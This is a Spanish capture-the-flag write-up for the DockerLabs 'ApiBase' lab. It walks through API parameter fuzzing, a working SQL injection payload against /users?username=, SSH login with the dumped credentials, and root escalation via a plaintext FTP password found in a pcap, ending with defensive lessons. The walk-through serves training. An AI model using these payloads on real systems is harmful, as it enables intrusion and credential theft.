---
title: "DockerLabs - ApiBase"
difficulty: "Fácil"
source: "DockerLabs"
---

Laboratorio para practicar el abuso de una API REST e inyección SQL para obtener acceso, con escalada de privilegios analizando el tráfico de red.

## Despliegue

```bash
bash auto_deploy.sh apibase.tar
```

## Reconocimiento

```bash
nmap -sCV -p- 172.17.0.2
```

Puertos detectados:
- **22/tcp** — SSH (OpenSSH)
- **5000/tcp** — HTTP (Werkzeug / Python 3.9)

## Enumeración API REST

La raíz de la API devuelve los endpoints disponibles:

```bash
curl -s http://172.17.0.2:5000/
# {"message": "No endpoint selected. Please use /add to add a user or /users to query users."}
```

Endpoints:
- `/users` — GET, requiere parámetro
- `/add` — POST, añadir usuario

Fuzzing del parámetro de `/users`:

```bash
for p in "username" "user" "id" "name" "query" "q" "search"; do
  resp=$(curl -s "http://172.17.0.2:5000/users?$p=test")
  echo "$p -> $resp"
done
```

Parámetro válido: `username` (resto devuelven "invalid parameter").

## Inyección SQL

El parámetro `username` es vulnerable a SQLi:

```bash
curl -s "http://172.17.0.2:5000/users?username=' OR '1'='1'--"
```

Respuesta — todos los usuarios de la base de datos:

```json
[
  [1, "pingu", "your_password"],
  [2, "pingu", "pinguinasio"]
]
```

## Intrusión

```bash
ssh pingu@172.17.0.2
# contraseña: pinguinasio
```

## Escalada de privilegios — Análisis de tráfico de red

En `/home` hay un archivo `network.pcap`. Lectura directa con cat:

```bash
cat /home/network.pcap
```

El pcap contiene credenciales FTP en texto plano:

```
LOGIN root
PASS balulero
Access Denied
```

Alguien intentó autenticarse como `root` por FTP con contraseña `balulero`. Se reutiliza esa contraseña:

```bash
su root
# contraseña: balulero
whoami
# root
```

## Conclusión

Cadena de ataque: API REST sin autenticación → SQLi en `/users?username=` → credenciales SSH → pcap con contraseña FTP en texto plano → root.

**Lecciones aprendidas:**
- Las APIs REST deben requerir autenticación incluso para consultas de lectura.
- Nunca concatenar input del usuario en queries SQL — usar prepared statements.
- Los protocolos en texto plano (FTP, Telnet) transmiten credenciales sin cifrar y son capturables.
- Los archivos .pcap con capturas de red pueden contener credenciales sensibles.
